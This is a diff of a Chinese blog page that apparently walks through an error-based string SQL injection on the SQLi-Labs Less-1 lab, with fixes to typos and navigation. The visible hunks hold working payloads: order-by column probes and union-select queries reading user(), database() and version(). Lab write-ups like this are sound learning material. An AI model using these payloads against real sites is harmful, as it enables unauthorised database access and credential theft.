@@ -501,11 +501,11 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据库的任意操作。</p>
-<p>​        SQL注入<strong>按参数的数字类型</strong>可分为：<code>数字型(Integer)</code>、<code>字符型(String)</code>；<strong>按返回结果</strong>可分为：<code>显错注入(Error-Based)</code>、<code>基于布尔的盲注(Boolean-Based Blind)</code>、<code>基于时间的盲注(Time-Based Blind)</code>；<strong>按HTTP请求类型</strong>可分为：<code>GET型注入(GET)</code>、<code>POST型注入(POST)</code>。本文测试的注入类型为：GET型、显错型、字符型注入。</p>
+<p>&emsp;&emsp;SQL注入<strong>按参数的数字类型</strong>可分为：<code>数字型(Integer)</code>、<code>字符型(String)</code>；<strong>按返回结果</strong>可分为：<code>显错注入(Error-Based)</code>、<code>基于布尔的盲注(Boolean-Based Blind)</code>、<code>基于时间的盲注(Time-Based Blind)</code>；<strong>按HTTP请求类型</strong>可分为：<code>GET型注入(GET)</code>、<code>POST型注入(POST)</code>。本文测试的注入类型为：GET型、显错型、字符型注入。</p>
 <h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul>
 <li>服务器系统：<code>Windows Server 2008</code></li>
 <li>中间件：<code>IIS</code></li>
-<li>数据库：<code>MySQ</code>L</li>
+<li>数据库：<code>MySQL</code></li>
 <li>客户机：<code>Windows 10</code></li>
 <li>靶机：<code>SQLi-Labs</code></li>
 </ul>
@@ -547,24 +547,24 @@
 ?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment" spellcheck="true">--+</span>
 ?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment" spellcheck="true">--+</span>
 ?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment" spellcheck="true">--+</span></code></pre>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby1操作结果.png" alt="orderby1操作结果"></center>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby1操作结果.png" alt="order by 1操作结果"></center>
 
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby2操作结果.png" alt="orderby2操作结果"></center>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby2操作结果.png" alt="order by 2操作结果"></center>
 
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby3操作结果.png" alt="orderby3操作结果"></center>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby3操作结果.png" alt="order by 3操作结果"></center>
 
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby4操作结果.png" alt="orderby4操作结果"></center>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/orderby4操作结果.png" alt="order by 4操作结果"></center>
 </li>
 <li><p>由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。</p>
 <pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,2,3--+</span></code></pre>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/UnionSelect语句判断SQL注入回显点.png" alt="UnionSelect语句判断SQL注入回显点"></center>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/UnionSelect语句判断SQL注入回显点.png" alt="Union Select语句判断SQL注入回显点"></center>
 
 <p>注：</p>
 <ul>
 <li>使用<code>union</code>进行联合查询是想要查询的数据回显，则需要第一个查询结果为空。</li>
 </ul>
 </li>
-<li><p>使用<code>user()、database()、veersion()</code>函数等获取当前数据库的信息，payload如下所示，操作结果如下图所示。</p>
+<li><p>使用<code>user()、database()、version()</code>函数等获取当前数据库的信息，payload如下所示，操作结果如下图所示。</p>
 <pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 获取当前用户信息</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/index.php?id=-1' union select 1,user(),3--+</span>
 <span class="token comment" spellcheck="true">-- 获取当前数据库名称</span>
@@ -605,7 +605,7 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/inde
 
 </li>
 </ol>
-<h1 id="0x06-实验分析"><a href="#0x06-实验分析" class="headerlink" title="0x06 实验分析"></a>0x06 实验分析</h1><p>​        此实验模拟的一个具有错误回显的字符型注入。最终的操作是得到一组用户名及其密码。</p>
+<h1 id="0x06-实验分析"><a href="#0x06-实验分析" class="headerlink" title="0x06 实验分析"></a>0x06 实验分析</h1><p>&emsp;&emsp;此实验模拟的一个具有错误回显的字符型注入。最终的操作是得到一组用户名及其密码。</p>
 <ul>
 <li>HTTP请求为：<code>GET</code></li>
 <li>参数格式为：<code>select * from users where id=&#39;参数&#39;;</code></li>
@@ -815,17 +815,16 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/inde
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
-            </div>
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/10/17/sql-zhu-ru-zhi-get-errorbased-singlequotes-string/">
+                <a href="/2020/10/17/sql-zhu-ru-zhi-get-errorbasd-intigerbased/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/56.jpg" class="responsive-img" alt="SQL注入之GET-ErrorBased-SingleQuotes-String">
+                        <img src="/medias/featureimages/57.jpg" class="responsive-img" alt="SQL注入之GET-ErrorBasd-IntigerBased">
                         
-                        <span class="card-title">SQL注入之GET-ErrorBased-SingleQuotes-String</span>
+                        <span class="card-title">SQL注入之GET-ErrorBasd-IntigerBased</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -835,9 +834,9 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/inde
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-10-17
-                            </span>
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-10-17
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -850,7 +849,6 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/inde
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -1082,7 +1080,7 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/inde
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">121.5k</span>
+            <span class="white-color">123.2k</span>
             
 
             <br>
